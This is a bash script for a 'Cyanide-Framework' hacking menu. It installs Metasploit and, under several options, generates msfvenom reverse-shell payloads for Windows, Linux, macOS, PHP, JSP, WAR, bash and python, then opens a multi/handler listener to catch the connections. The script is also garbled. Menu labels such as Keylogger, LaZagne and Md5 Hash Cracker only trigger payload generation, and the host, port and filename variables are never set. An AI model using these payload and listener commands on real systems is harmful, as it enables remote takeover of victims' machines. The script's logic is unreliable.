#!/usr/bin/env bash

resize -s 80 100 > /dev/null 

#Colors
cyan='\e[0;36m'
lightcyan='\e[96m'
green='\e[0;32m'
lightgreen='\e[1;32m'
white='\e[1;37m'
red='\e[1;31m'
yellow='\e[1;33m'
blue='\e[1;34m'
Escape="\033";
white="${Escape}[0m";
RedF="${Escape}[31m";
GreenF="${Escape}[32m";
LighGreenF="${Escape}[92m"
YellowF="${Escape}[33m";
BlueF="${Escape}[34m";
CyanF="${Escape}[36m";
Reset="${Escape}[0m";
# Check root
[[ `id -u` -eq 0 ]] > /dev/null 2>&1 || { echo  $red "You must be root to run the script"; echo ; exit 1; }
clear
# check internet 
function checkinternet() 
{
  ping -c 1 google.com > /dev/null 2>&1
  if [[ "$?" != 0 ]]
  then
    echo -e $yellow " Checking For Internet: ${RedF}FAILED"
    echo
    echo -e $red "This Script Needs An Active Internet Connection"
    echo
    echo -e $yellow " Cyanide-Framework Exit"
    echo && sleep 2
    exit
  else
    echo -e $yellow " Checking For Internet: ${LighGreenF}CONNECTED"
  fi
}
checkinternet

#check OS
echo -e $blue
sudo cat /etc/issue.net

sleep 0.05

pwd=$(pwd)

dlhost=$(hostname -I)

# Root Permission
if [[ "$(whoami)" != root ]]; then
echo "You are not a root User "
exit 1
fi
#check dependencies existence
echo -e $blue "" 
echo "(°_o) Checking dependencies configuration (°_o)" 
echo "                                       " 

# check if metasploit-framework is installed
which msfconsole > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
echo -e $green "[ ✔ ] Metasploit-Framework..............${LighGreenF}[ found ]"
which msfconsole > /dev/null 2>&1
sleep 2
else
echo -e $red "[ X ] Metasploit-Framework  -> ${RedF}not found "
echo -e $yellow "[ ! ] Installing Metasploit-Framework "
sudo apt-get install metasploit-framework -y
echo -e $blue "[ ✔ ] Done installing ...."
which msfconsole > /dev/null 2>&1
sleep 2
fi
#check if xterm is installed
which xterm > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
echo -e $green "[ ✔ ] Xterm.............................${LighGreenF}[ found ]"
which xterm > /dev/null 2>&1
sleep 2
else
echo ""
echo -e $red "[ X ] xterm -> ${RedF}not found! "
sleep 2
echo -e $yellow "[ ! ] Installing Xterm "
sleep 2
echo -e $green ""
sudo apt-get install xterm -y
clear
echo -e $blue "[ ✔ ] Done installing .... "
which xterm > /dev/null 2>&1
fi
#check if figlet is installed
which figlet > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
echo -e $green "[ ✔ ] Figlet............................${LighGreenF}[ found ]"
which figlet > /dev/null 2>&1
sleep 2
else
echo ""
echo -e $red "[ X ] Figlet -> ${RedF}not found! "
sleep 2
echo -e $yellow "[ ! ] Installing Figlet "
sleep 2
echo -e $green ""
sudo apt-get install figlet -y
clear
echo -e $blue "[ ✔ ] Done installing .... "
which figlet > /dev/null 2>&1
fi
banner() {
    
    echo -e "$red"
    if ! [ -x "$(command -v figlet)" ]; then
        echo 'Introducing Cyanide-Framework'
    else
        figlet Cyanide-Framework
    fi
    if ! [ -x "$(command -v toilet)" ]; then
        echo -e "\e[4;34m This Framework Was Created By \e[1;32mCyanide \e[0m"
    # else
    #     echo -e "\e[1;34mCreated By \e[1;34m"
    #     toilet -f mono12 -F border Cyanide-Framework
    fi
    echo -e "\e[1;34m For Any Queries Join Me!!!\e[0m"
    echo -e "\e[1;32m Telegram: XXXX \e[0m"
    echo -e "\e[4;32m YouTube: https://bit.ly/35YqryS \e[0m"
    echo " "

}
banner

echo -e $red "╔────────────────────────────────────────────────╗"
echo -e $red "|            Cyanide Framework v0.2              |"
echo -e $red "|  [ x ] Tool For Penetration Testing     [ x ]  |"
echo -e $red "|              watch your back                   |"           
echo -e $red "┖────────────────────────────────────────────────┙"

echo -e $red " 1. Network Based Attacks"
echo -e $red " 2. Web Based Attacks"
echo -e $red " 3. Keylogger"
echo -e $red " 4. Payload Genetator"
echo -e $red " 5. LaZagne"
echo -e $red " 6. Infectious Media Genetator"
echo -e $red " 7. TBomb"
echo -e $red " 8. Md5 Hash Cracker"
echo -e $red " 9. IP Locator"
echo -e $red    "..............................."
echo -e $yellow "Please select your option:"

#Checking User Input
re='[a-zA-Z]'
 echo -e $GreenF "..............................."
 read -p "[>>] Select> : " Number
 if [ $Number -gt 9 ] || [ $Number -lt 1 ] || [[ "$Number" =~ $re ]];
  then
   echo -e $red    "[ x ].......................................[ x ]"
   echo -e $RedF "You choose invalid option Please try again."
   echo -e $yellow "[*] Thanks For using Cyanide-Framework  :)"
   sleep 0.02
   exit 1   
 fi

case $Number in 
 Network|network|N|n|1) 
  echo -e $GreenF "[*]....................................[*]"
  echo -e $blue " 1. Mac_changer"
  echo -e $blue " 2. Wireless_hacking"
  echo -e $blue " 3. TBomb"
  echo -e $GreenF "[ ✔ ]....................................[ ✔ ]"
  echo -e $red    "..............................."
  echo -e $yellow "Select your option:"

#Checking User Input
 echo -e $GreenF "..............................."
 read -p "[>>] Select> : " number_option
 if [ $number_option -gt 3 ] || [ $number_option -lt 1 ] || [[ "$number_option" =~ $re ]];
  then
   echo -e $red    "[ x ].......................................[ x ]"
   echo -e $RedF "You choose invalid option Please try again."
   echo -e $yellow "[*] Thanks For using Cyanide-Framework  :)"
   sleep 0.02
   # exit 1
 elif [ $number_option == 1 ];
   then
    python3 mac_changer.py
    exit   

 fi
  ;;

  Web|web|W|w|2)
  msfvenom -p windows/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -f exe > $pwd/$filename.exe
  payload=windows/meterpreter/reverse_tcp
  echo -e $LighGreenF " Your Payload has been generated successfully in $pwd directory"
  ;;
 
  Keylogger|keylogger|K|k|3)
  msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -f elf > $pwd/$filename.elf
  payload=linux/x86/meterpreter/reverse_tcp
  echo " Your Payload has been generated successfully in $pwd directory"
  ;;

  Payload|payload|P|p|4)
  msfvenom -p osx/x86/shell_reverse_tcp LHOST="$lhost" LPORT="$lport" -f macho > $pwd/$filename.macho
  payload=osx/x86/shell_reverse_tcp
  echo " Your Payload has been generated successfully in $pwd directory"
 ;;
  
  LaZagne|lazagne|L|l|5)
  msfvenom -p php/meterpreter_reverse_tcp LHOST="$lhost" LPORT="$lport" -f raw > $pwd/$filename.php
  payload=php/meterpreter_reverse_tcp
  echo " Your Payload has been generated successfully in $pwd directory"
  ;;

  Infectious|infectious|I|i|6)
  msfvenom -p java/jsp_shell_reverse_tcp LHOST="lhost" LPORT="$lport" -f raw > $pwd/$filename.jsp 
  payload=java/jsp_shell_reverse_tcp
  echo " Your Payload has been generated successfully in $pwd directory"
  ;;

  TBomb|tbomb|T|t|7)
  msfvenom -p java/jsp_shell_reverse_tcp LHOST=$lhost LPORT=$lport -f war > $pwd/$filename.war
  payload=java/jsp_shell_reverse_tcp
  echo " Your Payload has been generated successfully in $pwd directory"
  ;;

  Md5|md5|M|m|8)
  msfvenom -p cmd/unix/reverse_bash LHOST=$lhost LPORT=$lport -f raw > $pwd/$filename.sh
  payload=cmd/unix/reverse_bash
  echo " Your Payload has been generated successfully in $pwd directory"
  ;;
 
  IP|ip|I|i|9)
  msfvenom -p cmd/unix/reverse_python LHOST=$lhost LPORT=$lport -f raw > $pwd/$filename.py
  payload=cmd/unix/reverse_python
  echo " Your Payload has been generated successfully in $pwd directory"
  ;;

esac

#########################################################
echo -e $GreenF "[*]................................[*]"
echo " Do you want to open msfconsole?"
read -p " Yes/No? " answer

if [[ $answer == "YES" ||  $answer == "Yes" ||  $answer == "yes" ||  $answer == "Y" ||  $answer == "y" ]]; then
which msfconsole > /dev/null 2>&1
 if [ "$?" -eq "0" ]; then
 echo -e $green "[ ✔ ] Metasploit-Framework..............${LighGreenF}[ found ]"
 which msfconsole > /dev/null 2>&1
 sleep 2
 else
  echo -e $red "[ X ] Metasploit-Framework  -> ${RedF}not found "
  echo -e $yellow "[ ! ] Installing Metasploit-Framework "
  sudo apt-get install metasploit-framework -y
  echo -e $blue "[ ✔ ] Done installing ...."
  which msfconsole > /dev/null 2>&1
 fi
 sleep 1
 echo " Opening Metasploit"
 sleep 0.05
 xterm -T "CYANIDE MULTI/HANDLER" -fa monaco -fs 10 -bg black -e "msfconsole -x 'use multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $payload; exploit'"
elif [[ $answer == "NO" ||  $answer == "No" ||  $answer == "no" ||  $answer == "N" ||  $answer == "n" ]]; then
 echo -e $GreenF "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
 echo "Thanks for using Cyanide Framework"

else
 echo -e $RedF "[ X ]....................................[ X ]"
 echo "Wrong option please try again"
fi
